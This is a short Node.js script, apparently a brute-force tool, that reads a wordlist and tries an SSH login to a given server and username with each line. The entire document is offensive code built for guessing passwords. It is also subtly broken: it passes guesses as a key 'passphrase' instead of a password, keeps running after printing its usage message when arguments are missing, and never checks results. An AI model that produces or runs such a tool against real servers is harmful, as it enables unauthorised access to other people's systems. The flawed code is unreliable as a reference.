const { NodeSSH } = require('node-ssh')
const ssh = new NodeSSH()

const fs = require('fs')
const readline = require('readline')
console.log(process.argv)
if (process.argv.length < 5) {
    console.log(`Usage: ${process.argv[1]} username server wordlist`)
}
const rl = readline.createInterface({
    input: fs.createReadStream(process.argv[4]),
    crlfDelay: Infinity
  });

rl.on('line', (password) => {
    ssh
        .connect({
            host: process.argv[3],
            username: process.argv[2],
            passphrase: password
        })
})
